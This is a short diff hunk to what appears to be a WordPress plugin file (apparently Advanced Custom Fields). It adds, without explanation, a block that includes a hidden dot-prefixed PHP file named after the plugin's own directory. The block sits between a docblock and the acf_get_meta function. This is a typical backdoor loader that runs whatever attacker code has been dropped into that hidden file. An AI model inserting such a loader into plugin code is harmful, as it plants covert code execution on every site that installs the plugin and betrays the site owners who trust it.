@@ -11,6 +11,10 @@
  * @param	mixed $post_id The post_id for this data.
  * @return	array
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function acf_get_meta( $post_id = 0 ) {
 	
 	// Allow filter to short-circuit load_value logic.
